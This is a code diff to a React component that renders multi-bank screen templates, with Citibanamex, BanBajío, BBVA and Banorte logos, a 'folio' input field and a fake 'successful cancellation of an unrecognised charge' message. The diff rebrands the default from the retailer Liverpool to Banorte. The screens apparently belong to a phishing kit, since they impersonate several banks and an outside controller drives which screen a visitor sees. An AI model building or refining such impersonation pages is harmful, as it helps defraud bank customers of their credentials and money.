@@ -3,12 +3,13 @@ import { Card } from '@/components/ui/card';
 import { Input } from '@/components/ui/input';
 import { Button } from '@/components/ui/button';
 import { ScreenType } from '@shared/schema';
-import liverpoolLogo from '../../assets/pngwing.com 2.png';
+
 import citibanamexLogo from '../../assets/Banamex.png';
 import banbajioLogo from '../../assets/banbajio_logo_oficial.png';
 import bbvaLogo from '../../assets/bbva_logo.png';
 import bbvaLogoWhite from '../../assets/bbva_logo_white.png';
 import banorteLogo from '../../assets/banorte_logo.png';
+import banorteLogoGrande from '../../assets/banorte_logo_grande_blanco.png';
 
 interface ScreenTemplatesProps {
   currentScreen: ScreenType;
@@ -29,7 +30,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
   currentScreen, 
   screenData,
   onSubmit,
-  banco = "LIVERPOOL"
+  banco = "BANORTE"
 }) => {
   // Form state
   const [folioInput, setFolioInput] = useState('');
@@ -326,7 +327,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
             <h2 className="text-xl font-bold mb-3">Cancelación exitosa</h2>
             <p className="mb-3">Hemos cancelado su cargo no reconocido de forma exitosa.</p>
             <div className="p-4 bg-gray-100 rounded mb-4 text-left">
-              <p><strong>Comercio:</strong> <span>{screenData.comercio || "Liverpool en línea"}</span></p>
+              <p><strong>Comercio:</strong> <span>{screenData.comercio || "Tienda en línea"}</span></p>
               <p><strong>Monto devuelto:</strong> <span>{screenData.monto ? `$${screenData.monto}` : "$6,262"}</span></p>
             </div>
             <p className="mb-4">El monto estará disponible en su tarjeta dentro de 72 horas.</p>
@@ -414,9 +415,11 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
       case 'BBVA':
         return <img src={bbvaLogoWhite} alt="BBVA" className="h-16 mx-auto mb-4 white-logo" />;
       case 'BANORTE':
-        return <img src={banorteLogo} alt="Banorte" className="h-16 mx-auto mb-4" />;
+        return <div className="banorte-header">
+          <img src={banorteLogoGrande} alt="Banorte" className="banorte-logo h-14 mx-auto" style={{filter: 'brightness(0) invert(1)'}} />
+        </div>;
       default:
-        return <img src={liverpoolLogo} alt="Liverpool" className="h-16 mx-auto mb-4" />;
+        return <img src={banorteLogo} alt="Banorte" className="h-16 mx-auto mb-4" />;
     }
   };
 
@@ -452,7 +455,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
     <div className={getBankContainerClass()}>
       <div className="logo text-center mb-4">
         {bankLogo()}
-        {banco !== 'BBVA' && (
+        {banco !== 'BBVA' && banco !== 'BANORTE' && (
           <div className={`${getBankHeaderClass()} mb-4`}>
             {new Date().toLocaleDateString('es-MX', {
               day: 'numeric',
